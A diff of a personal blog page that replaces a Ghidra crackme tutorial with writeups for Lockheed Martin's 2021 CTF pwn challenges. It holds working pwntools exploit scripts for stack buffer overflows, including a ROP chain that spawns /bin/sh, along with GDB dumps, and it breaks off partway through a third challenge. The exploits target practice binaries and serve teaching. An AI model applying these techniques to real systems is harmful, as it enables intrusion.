@@ -11,7 +11,7 @@
 
   <title>
     
-      Solving a Basic Crackme Using Ghidra &middot; Nihaal Prasad
+      LM Cyber CTF Writeups For PWN And Web Challenges &middot; Nihaal Prasad
     
   </title>
 
@@ -184,7 +184,7 @@
 
     <main class="container">
       <div class="content">
-  <h1 class="page-heading">Solving a Basic Crackme Using Ghidra</h1>
+  <h1 class="page-heading">LM Cyber CTF Writeups For PWN And Web Challenges</h1>
   <div class="post-meta">
   <span class="post-categories">
     
@@ -193,101 +193,548 @@
 
   <hr>
   <div class="post-body">
-    <p>Recently, the NSA released a free reverse-engineering tool called <a href="https://www.nsa.gov/resources/everyone/ghidra/">Ghidra</a>. Today, I decided to take a look at it and try to solve a basic crackme using this tool. <a href="https://crackmes.one/crackme/5c1a939633c5d41e58e005d1">This</a> is the link to the crackme that I will be trying to solve today.</p>
+    <p>Recently, I played in Lockheed Martin’s 2021 CTF challenge, and my team, nullbytes, got first place. I mainly worked on the PWN and web exploitation challenges for my team, so here are my solutions for all the problems in those two categories.</p>
 
-<p>Once I downloaded the crackme file, I ran it and looked at what the program did. Here is its basic output:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enter the magic string
-a
-wrong string
-No flag for you.
-</code></pre></div></div>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enter the magic string
-Some Random Input
-too long...sorry no flag for you!!!
-</code></pre></div></div>
-<p>It looks like it takes some sort of input value, and if that input value is what it expects, then it will print out the flag. If the input value is incorrect or too long, then it will print out a different message. Our goal here is to find out the correct input value.</p>
+<h3 id="cereal-creator">Cereal Creator</h3>
 
-<p>I started up Ghidra, created a new project, and added the binary file to my project. You can do this by first clicking File-&gt;New Project, and then dragging and dropping the binary file into the project.</p>
-
-<p><img src="../../../assets/img/2019-solving-a-basic-crackme-using-ghidra/ghidra_project.png" /></p>
-
-<p><img style="float: right" src="../../../assets/img/2019-solving-a-basic-crackme-using-ghidra/symbol_tree.png" /></p>
-
-<p>When I opened the file in Ghidra, a pop-up came up in Ghidra asking me if I wanted to analyze the binary now. I hit yes and waited a second before it was done analyzing the file. Then I went to the symbol tree on the left, typed in “main” to find the main function, and clicked on it. This brought me to the main method, and on the other two windows I could see the main method’s assembly and decompiled code.</p>
-
-<p>Here is the decompiled code. I changed a few of the variable names to make it a little bit more readable. You can do this by right-clicking on the variable and clicking “Rename variable.”</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>undefined8 main(void)
-
-{
-  size_t len;
-  size_t len2;
-  long lVar1;
-  char input [112];
-  int counter;
-  int strValues;
-  
-  strValues = 0;
-  puts("enter the magic string");
-  fgets(input,100,stdin);
-  len = strlen(input);
-  if (len &lt; 0xc) {
-    counter = 0;
-    while( true ) {
-      len2 = strlen(input);
-      if (len2 &lt;= (ulong)(long)counter) break;
-      strValues = strValues + (int)input[(long)counter];
-      counter = counter + 1;
-    }
-    if (strValues == 1000) {
-      lVar1 = strcat_str();
-      printf("flag is flag{");
-      counter = 0;
-      while (counter &lt; 10) {
-        putchar((int)*(char *)(lVar1 + (long)counter));
-        counter = counter + 1;
-      }
-      puts("}");
-    }
-    else {
-      puts("wrong string\nNo flag for you.");
-    }
-  }
-  else {
-    puts("too long...sorry no flag for you!!!");
-  }
-  return 0;
-}
+<p>The first PWN challenge can be downloaded <a href="../../../assets/other/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/pwn100">here</a>. This is a program that allows the user to “eat cereal.”</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./pwn100
+<span class="o">[</span>1] Add Cereal flavor
+<span class="o">[</span>2] Add milk
+<span class="o">[</span>3] Eat
+<span class="o">[</span>4] <span class="nb">exit
+</span>1
+What kind of cereal would you like to add to your bowl?
+AAAAAAAAAAAAAA
+adding cereal into your bowl
+added cereal to bowl
+<span class="o">[</span>1] Add Cereal flavor
+<span class="o">[</span>2] Add milk
+<span class="o">[</span>3] Eat
+<span class="o">[</span>4] <span class="nb">exit
+</span>2
+pooring milk ...
+<span class="o">[</span>1] Add Cereal flavor
+<span class="o">[</span>2] Add milk
+<span class="o">[</span>3] Eat
+<span class="o">[</span>4] <span class="nb">exit
+</span>3
+eating our bowl
+Bowl, AAAAAAAAAAAAAA with milk, was a great bowl of cereal
 </code></pre></div></div>
 
-<p>The first thing that the code does is print out “enter the magic string” and reads in the value that you typed in into a variable that I named “input”. It also calculates the length of this input variable and makes sure that it is less than 12 (which makes it a maximum of ten characters plus a newline character). After that, there is a loop that adds up all of the ascii values of each character of the input into an integer that I named “strValues”. Then, finally, it prints out the flag if the total values of all the added ascii values equals 1000.</p>
-
-<p>Since I knew that I could type in a maximum of ten characters, the first thing I tried to do was to divide 1000 by 10 to figure out the ascii value of the characters that I needed to type in ten times. Since 1000/10 = 100, and ‘d’ is 100 in ascii, I decided to type in ‘d’ ten times and see what happened.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c "print('d' * 10)" | ./rev30
-enter the magic string
-wrong string
-No flag for you.
+<p>The binary has NX enabled, meaning that we cannot inject shellcode into the stack and execute it.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  checksec
+<span class="o">[</span>+] checksec <span class="k">for</span> <span class="s1">'/home/nihaal/Desktop/LMCTF/pwn100'</span>
+Canary                        : No
+NX                            : Yes
+PIE                           : No
+Fortify                       : No
+RelRO                         : Partial
 </code></pre></div></div>
 
-<p>Unforunately, this did not work. At first I didn’t understand why this didn’t work, but then I realized that I forgot to take into account the fact that the while loop was also adding up the value of the newline character, which had an ascii value of 10. This meant that instead of doing 1000/10 to figure out the ascii value of the character I had to type in 10 times, I had to do (1000-10)/10 to take this into account. This gave me a value of 99, or ‘c’ in ascii. I tried to use ‘c’ ten times, and lo and behold:</p>
+<p>I played around with some of the input parameters, and I eventually found out that the program crashed if you eat something with a cereal flavor that has a long string. Using this crash, I created a Python script that overwrites <code class="highlighter-rouge">RIP</code> with a bunch of Bs.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c "print('c' * 10)" | ./rev03 
-enter the magic string
-flag is flag{!#&amp;*/5&lt;DMW}
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./pwn100"</span><span class="p">)</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s">"b *do_main+189</span><span class="se">\n</span><span class="s">c"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">316</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">x</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'UTF-8'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"BBBBBBBB"</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
-<p>Thanks for reading this writeup. I hope you enjoyed it.</p>
+<p>Running this code would produce the following GDB prompt. As you can see, the saved <code class="highlighter-rouge">RIP</code> value on the stack has been overwritten with a bunch of Bs. This means that we can jump to any function that we want.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span> Legend: Modified register | Code | Heap | Stack | String <span class="o">]</span>
+────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+<span class="nv">$rax</span>   : 0x00007ffcd7ad8cf0  →  0x0000000000000000
+<span class="nv">$rbx</span>   : 0x0
+<span class="nv">$rcx</span>   : 0x0
+<span class="nv">$rdx</span>   : 0x64
+<span class="nv">$rsp</span>   : 0x00007ffcd7ad8d68  →  <span class="s2">"BBBBBBBB"</span>
+<span class="nv">$rbp</span>   : 0x3b3a393837363534 <span class="o">(</span><span class="s2">"456789:;"</span>?<span class="o">)</span>
+<span class="nv">$rsi</span>   : 0x0
+<span class="nv">$rdi</span>   : 0x00007ffcd7ad8cf0  →  0x0000000000000000
+<span class="nv">$rip</span>   : 0x0000000000400a99  →  &lt;do_main+189&gt; ret
+<span class="nv">$r8</span>    : 0xffffffff
+<span class="nv">$r9</span>    : 0x9d
+<span class="nv">$r10</span>   : 0xfffffffffffff28e
+<span class="nv">$r11</span>   : 0x00007f0b0190ee70  →  &lt;__memset_avx2_unaligned+0&gt; vmovd xmm0, esi
+<span class="nv">$r12</span>   : 0x0000000000400710  →  &lt;_start+0&gt; xor ebp, ebp
+<span class="nv">$r13</span>   : 0x0
+<span class="nv">$r14</span>   : 0x0
+<span class="nv">$r15</span>   : 0x0
+<span class="nv">$eflags</span>: <span class="o">[</span>ZERO carry PARITY adjust sign <span class="nb">trap </span>INTERRUPT direction overflow resume virtualx86 identification]
+<span class="nv">$cs</span>: 0x0033 <span class="nv">$ss</span>: 0x002b <span class="nv">$ds</span>: 0x0000 <span class="nv">$es</span>: 0x0000 <span class="nv">$fs</span>: 0x0000 <span class="nv">$gs</span>: 0x0000
+────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffcd7ad8d68│+0x0000: <span class="s2">"BBBBBBBB"</span>   ← <span class="nv">$rsp</span>
+0x00007ffcd7ad8d70│+0x0008: 0x00007ffcd7ad8e00  →  0x0000000000000000
+0x00007ffcd7ad8d78│+0x0010: 0x0000000100000000
+0x00007ffcd7ad8d80│+0x0018: 0x0000000000400ae0  →  &lt;__libc_csu_init+0&gt; push r15
+0x00007ffcd7ad8d88│+0x0020: 0x00007f0b017d2d0a  →  &lt;__libc_start_main+234&gt; mov edi, eax
+0x00007ffcd7ad8d90│+0x0028: 0x00007ffcd7ad8e78  →  0x00007ffcd7ada464  →  <span class="s2">"./pwn100"</span>
+0x00007ffcd7ad8d98│+0x0030: 0x0000000100000000
+0x00007ffcd7ad8da0│+0x0038: 0x0000000000400a9a  →  &lt;main+0&gt; push rbp
+──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x400a91 &lt;do_main+181&gt;    jne    0x400a02 &lt;do_main+38&gt;
+     0x400a97 &lt;do_main+187&gt;    nop
+     0x400a98 &lt;do_main+188&gt;    leave
+ →   0x400a99 &lt;do_main+189&gt;    ret
+<span class="o">[!]</span> Cannot disassemble from <span class="nv">$PC</span>
+──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+<span class="o">[</span><span class="c">#0] Id 1, Name: "pwn100", stopped, reason: BREAKPOINT</span>
+────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+<span class="o">[</span><span class="c">#0] 0x400a99 → do_main()</span>
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  info frame
+Stack level 0, frame at 0x7ffcd7ad8d68:
+ rip <span class="o">=</span> 0x400a99 <span class="k">in </span>do_main<span class="p">;</span> saved rip <span class="o">=</span> 0x4242424242424242
+ called by frame at 0x7ffcd7ad8d78
+ Arglist at 0x3b3a393837363534, args:
+ Locals at 0x3b3a393837363534, Previous frame<span class="s1">'s sp is 0x7ffcd7ad8d70
+ Saved registers:
+  rip at 0x7ffcd7ad8d68
+</span></code></pre></div></div>
+
+<p>Unfortunately, I did not have control over more than eight bytes on the stack. If I tried to use a ROP chain with more than one gadget, it would only execute the first gadget and ignore all the others. This meant that I had to find a single function that would produce a shell for me. I looked around at what functions were inside of the binary, and I saw a function named <code class="highlighter-rouge">custom_features</code>. This function executes <code class="highlighter-rouge">execve("/bin/sh")</code>, which is exactly what I needed.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  info functions custom_features
+All functions matching regular expression <span class="s2">"custom_features"</span>:
+
+Non-debugging symbols:
+0x00000000004007f7  custom_features
+gef➤  disas custom_features
+Dump of assembler code <span class="k">for function </span>custom_features:
+   0x00000000004007f7 &lt;+0&gt;:     push   rbp
+   0x00000000004007f8 &lt;+1&gt;:     mov    rbp,rsp
+   0x00000000004007fb &lt;+4&gt;:     sub    rsp,0x10
+   0x00000000004007ff &lt;+8&gt;:     lea    rax,[rip+0x362]        <span class="c"># 0x400b68</span>
+   0x0000000000400806 &lt;+15&gt;:    mov    QWORD PTR <span class="o">[</span>rbp-0x10],rax
+   0x000000000040080a &lt;+19&gt;:    mov    QWORD PTR <span class="o">[</span>rbp-0x8],0x0
+   0x0000000000400812 &lt;+27&gt;:    lea    rax,[rbp-0x10]
+   0x0000000000400816 &lt;+31&gt;:    mov    edx,0x0
+   0x000000000040081b &lt;+36&gt;:    mov    rsi,rax
+   0x000000000040081e &lt;+39&gt;:    lea    rdi,[rip+0x343]        <span class="c"># 0x400b68</span>
+   0x0000000000400825 &lt;+46&gt;:    call   0x4006c0 &lt;execve@plt&gt;
+   0x000000000040082a &lt;+51&gt;:    nop
+   0x000000000040082b &lt;+52&gt;:    leave
+   0x000000000040082c &lt;+53&gt;:    ret
+End of assembler dump.
+gef➤  x/s 0x400b68
+0x400b68:       <span class="s2">"/bin/sh"</span>
+</code></pre></div></div>
+
+<p>All I had to do now to get a shell was to replace the Bs in my script with the address <code class="highlighter-rouge">0x4007f7</code>. Running this script would give me a shell.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./pwn100"</span><span class="p">)</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s">"b *do_main+189</span><span class="se">\n</span><span class="s">c"</span><span class="p">)</span>
+<span class="c1"># p = remote("challenges.ctfd.io", 30429)
+</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">316</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">x</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'UTF-8'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4007f7</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="cereal-creator-2">Cereal Creator 2</h3>
+<p>This binary, which you can download <a href="../../../assets/other/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/pwn200">here</a>, was very similar to the last one, and it also had the NX bit enabled.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./pwn200
+<span class="o">[</span>1] Add Cereal flavor
+<span class="o">[</span>2] Add milk
+<span class="o">[</span>3] Eat
+<span class="o">[</span>4] <span class="nb">exit
+</span>1
+get ready to add some cereal!!
+
+current buf: BowlWhat kind of cereal would you like to add to your bowl?
+AAAAAAAAAAAAAAAAAAAAAAAAAA
+adding cereal into your bowl
+added cereal to bowl
+<span class="o">[</span>1] Add Cereal flavor
+<span class="o">[</span>2] Add milk
+<span class="o">[</span>3] Eat
+<span class="o">[</span>4] <span class="nb">exit
+</span>2
+pooring milk ...
+<span class="o">[</span>1] Add Cereal flavor
+<span class="o">[</span>2] Add milk
+<span class="o">[</span>3] Eat
+<span class="o">[</span>4] <span class="nb">exit
+</span>3
+eating our bowl
+Bowl, AAAAAAAAAAAAAAAAAAAAAAAAAA with milk, was a great bowl of cereal
+</code></pre></div></div>
+
+<p>Once again, I found out that sending a long enough string to the cereal flavor input would cause the program to crash when you eat it. Although, this time the offset was slightly different.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./pwn200"</span><span class="p">)</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s">"c"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">120</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"BBBBBBBB"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"CCCCCCCC"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"DDDDDDDD"</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>As you can see from GDB below, not only was I able to overwrite <code class="highlighter-rouge">RIP</code> with this script, but this time, I was also able to write more data to the stack. This means that ROP chains can be used for this attack.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span> Legend: Modified register | Code | Heap | Stack | String <span class="o">]</span>
+────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+<span class="nv">$rax</span>   : 0x15
+<span class="nv">$rbx</span>   : 0x0
+<span class="nv">$rcx</span>   : 0x00007f08250e7ed3  →  0x5577fffff0003d48 <span class="o">(</span><span class="s2">"H="</span>?<span class="o">)</span>
+<span class="nv">$rdx</span>   : 0x0
+<span class="nv">$rsp</span>   : 0x00007ffe92638b18  →  <span class="s2">"BBBBBBBBCCCCCCCCDDDDDDDD"</span>
+<span class="nv">$rbp</span>   : 0x4141414141414141 <span class="o">(</span><span class="s2">"AAAAAAAA"</span>?<span class="o">)</span>
+<span class="nv">$rsi</span>   : 0x00007f08251b8723  →  0x1ba670000000000a
+<span class="nv">$rdi</span>   : 0x00007f08251ba670  →  0x0000000000000000
+<span class="nv">$rip</span>   : 0x0000000000400981  →  &lt;add_cereal+162&gt; ret
+<span class="nv">$r8</span>    : 0x15
+<span class="nv">$r9</span>    : 0x00007ffe92638c10  →  <span class="s2">"Bowl, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span>
+<span class="nv">$r10</span>   : 0x1b
+<span class="nv">$r11</span>   : 0x246
+<span class="nv">$r12</span>   : 0x0000000000400750  →  &lt;_start+0&gt; xor ebp, ebp
+<span class="nv">$r13</span>   : 0x0
+<span class="nv">$r14</span>   : 0x0
+<span class="nv">$r15</span>   : 0x0
+<span class="nv">$eflags</span>: <span class="o">[</span>ZERO carry PARITY adjust sign <span class="nb">trap </span>INTERRUPT direction overflow RESUME virtualx86 identification]
+<span class="nv">$cs</span>: 0x0033 <span class="nv">$ss</span>: 0x002b <span class="nv">$ds</span>: 0x0000 <span class="nv">$es</span>: 0x0000 <span class="nv">$fs</span>: 0x0000 <span class="nv">$gs</span>: 0x0000
+────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffe92638b18│+0x0000: <span class="s2">"BBBBBBBBCCCCCCCCDDDDDDDD"</span>   ← <span class="nv">$rsp</span>
+0x00007ffe92638b20│+0x0008: <span class="s2">"CCCCCCCCDDDDDDDD"</span>
+0x00007ffe92638b28│+0x0010: <span class="s2">"DDDDDDDD"</span>
+0x00007ffe92638b30│+0x0018: 0x000000006c770000
+0x00007ffe92638b38│+0x0020: 0x35ca06701eb30600
+0x00007ffe92638b40│+0x0028: 0x00007f08251b7980  →  0x00000000fbad2088
+0x00007ffe92638b48│+0x0030: 0x00007f08251b94a0  →  0x0000000000000000
+0x00007ffe92638b50│+0x0038: 0x0000000000400750  →  &lt;_start+0&gt; xor ebp, ebp
+──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x40097a &lt;add_cereal+155&gt; call   0x4006b0 &lt;puts@plt&gt;
+     0x40097f &lt;add_cereal+160&gt; nop
+     0x400980 &lt;add_cereal+161&gt; leave
+ →   0x400981 &lt;add_cereal+162&gt; ret
+<span class="o">[!]</span> Cannot disassemble from <span class="nv">$PC</span>
+──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+<span class="o">[</span><span class="c">#0] Id 1, Name: "pwn200", stopped, reason: SIGSEGV</span>
+────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+<span class="o">[</span><span class="c">#0] 0x400981 → add_cereal()</span>
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  info frame
+Stack level 0, frame at 0x7ffe92638b18:
+ rip <span class="o">=</span> 0x400981 <span class="k">in </span>add_cereal<span class="p">;</span> saved rip <span class="o">=</span> 0x4242424242424242
+ called by frame at 0x7ffe92638b28
+ Arglist at 0x4141414141414141, args:
+ Locals at 0x4141414141414141, Previous frame<span class="s1">'s sp is 0x7ffe92638b20
+ Saved registers:
+  rip at 0x7ffe92638b18
+</span></code></pre></div></div>
+
+<p>I took a look at the <code class="highlighter-rouge">custom_feature</code> function inside of Ghidra’s decompiler, and unlike in the previous binary, this function will only produce a shell if the first parameter is equal to <code class="highlighter-rouge">0xdeadbeef</code>. Note that <code class="highlighter-rouge">-0x21524111</code> is equal to <code class="highlighter-rouge">0xdeadbeef</code>.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">custom_feature</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_18</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_10</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">param_1</span> <span class="o">==</span> <span class="o">-</span><span class="mh">0x21524111</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">local_18</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>
+    <span class="n">local_10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">,(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"you are not authenticated to do this :&lt;"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>In order to use the <code class="highlighter-rouge">custom_feature</code> function, I had to create a ROP chain that moves <code class="highlighter-rouge">0xdeadbeef</code> into RDI before calling <code class="highlighter-rouge">custom_feature</code>. To do this, I searched for a POP RDI instruction.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ropper <span class="nt">--file</span> pwn200 <span class="nt">--search</span> <span class="s2">"pop rdi"</span>
+<span class="o">[</span>INFO] Load gadgets from cache
+<span class="o">[</span>LOAD] loading... 100%
+<span class="o">[</span>LOAD] removing double gadgets... 100%
+<span class="o">[</span>INFO] Searching <span class="k">for </span>gadgets: pop rdi
+
+<span class="o">[</span>INFO] File: pwn200
+0x0000000000400be3: pop rdi<span class="p">;</span> ret<span class="p">;</span>
+</code></pre></div></div>
+
+<p>After that, I looked up the address of the <code class="highlighter-rouge">custom_feature</code> function.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  info functions custom_feature
+All functions matching regular expression <span class="s2">"custom_feature"</span>:
+
+Non-debugging symbols:
+0x0000000000400837  custom_feature
+</code></pre></div></div>
+
+<p>Now it’s easy to construct a proper ROP chain using the Python code from earlier. Running the code below will give you a shell.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./pwn200"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">120</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400be3</span><span class="p">)</span> <span class="c1"># POP RDI
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400837</span><span class="p">)</span> <span class="c1"># custom_feature()
+</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="name-tracker">Name Tracker</h3>
+<p>You can download the binary <a href="../../../assets/other/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/pwn300">here</a> and the library <a href="../../../assets/other/2021-1-9-lm-cyber-ctf-writeups-for-pwn-and-web-challenges/libc-2.31.so">here</a>. This binary was a little bit tougher than the other two, even though it was worth the same amount of points. The program maintains an array of strings, and it allows you to input values into this array. The user can specify the index in the array where he/she wants to save the string.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./pwn300
+<span class="o">[</span>1] add name
+<span class="o">[</span>2] print name
+<span class="o">[</span>3] <span class="nb">exit
+</span>1
+index: 0
+pls give the name:
+AAAAAAAAAAAAAAAAAAAAAA
+<span class="o">[</span>1] add name
+<span class="o">[</span>2] print name
+<span class="o">[</span>3] <span class="nb">exit
+</span>2
+index: 0
+AAAAAAAAAAAAAAAAAAAAAA
+
+<span class="o">[</span>1] add name
+<span class="o">[</span>2] print name
+<span class="o">[</span>3] <span class="nb">exit
+</span>3
+</code></pre></div></div>
+
+<p>When decompiling this program inside of Ghidra, you can see that the <code class="highlighter-rouge">main()</code> function first sets a function pointer to be equal to a pointer to <code class="highlighter-rouge">puts()</code>. This function pointer is placed right at the very end of the <code class="highlighter-rouge">names</code> array, which is supposed to contain all of the user’s input values.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">names</span><span class="p">.</span><span class="n">_10000_8_</span> <span class="o">=</span> <span class="n">puts</span><span class="p">;</span>
+  <span class="n">do_main</span><span class="p">();</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This function pointer is later used by the <code class="highlighter-rouge">print_name()</code> function, whose decompilation is shown below.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">print_name</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">local_14</span><span class="p">;</span>
